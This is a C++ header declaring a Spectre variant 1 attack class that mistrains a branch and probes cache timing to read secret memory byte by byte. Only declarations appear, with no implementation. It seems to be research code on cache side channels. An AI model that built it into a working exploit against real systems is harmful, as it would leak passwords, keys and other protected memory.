//
// Created by sage on 1/13/21.
//

#ifndef CACHECASH_SPECTREV1_H
#define CACHECASH_SPECTREV1_H

#include <functional>
#include <cacheutils.h>

// void fn_vuln(size_t) is defined:
//      let k := *(p_base + x)
//      then p_scratchpad + k*block_len is brought into the cache
// Therefore, if we call fn_vuln(2), then we should see p_scratchpad + 2*block_len in the cache

class Spectrev1 {
public:

    inline Spectrev1(
            uint8_t *p_base,
            uint8_t  *p_scratchpad,
            std::function<volatile void(volatile size_t)> &&fn_vuln,
            std::function<volatile size_t(volatile size_t)> &&fn_get_trainx,
            size_t block_len,
            size_t n_max_tries,
            int n_trainings)
        : p_base(p_base),
          p_scratchpad(p_scratchpad),
          fn_vuln(fn_vuln),
          fn_get_trainx(fn_get_trainx),
          block_len(block_len),
          n_max_tries(n_max_tries),
          n_trainings(n_trainings),
          cachelinesize(get_cachelinesize())
    {
        get_thresh(0);
    }

    // Read n_bytes from p_secret and write it to p_buf
    // Require: At least n_bytes allocated from p_buf
    volatile void read(const volatile void *p_secret, size_t n_bytes, uint8_t *p_buf);

    // Read a byte from p_secret into p_val
    volatile void read_byte(const volatile void *p_secret, uint8_t *p_val);

private:
    volatile void do_attack(size_t train_x, size_t mal_x);
    volatile void mistrain(size_t train_x, size_t mal_x);
    volatile void find_hits(size_t train_x);
    volatile uint8_t *p_base;                // pointer to the base address from which we calc secret
    volatile uint8_t *p_scratchpad;          // probe array
    std::function<volatile void(volatile size_t)> fn_vuln;
    std::function<volatile size_t(volatile size_t)> fn_get_trainx;
    const size_t block_len;
    const size_t n_max_tries;
    const int n_trainings;

    // Index of the two blocks (p_scratchpad + high*block_len) with the highest number of hits
    uint8_t high;
    uint8_t high2;

    const size_t cachelinesize;

    int results[MAX_BYTE];      // track hits in p_base
};


#endif //CACHECASH_SPECTREV1_H
